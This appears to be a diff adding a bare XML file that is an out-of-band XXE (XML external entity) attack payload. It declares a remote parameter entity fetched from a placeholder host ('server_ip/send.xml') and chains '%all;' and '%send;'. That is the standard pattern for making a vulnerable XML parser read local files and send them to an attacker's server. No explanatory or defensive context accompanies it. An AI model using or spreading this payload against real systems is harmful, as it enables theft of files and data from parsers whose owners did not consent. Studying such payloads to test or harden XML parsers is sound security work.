@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+        <!ENTITY % remote SYSTEM "http://server_ip/send.xml">
+        %remote;
+        %all;
+        %send;
+        ]>
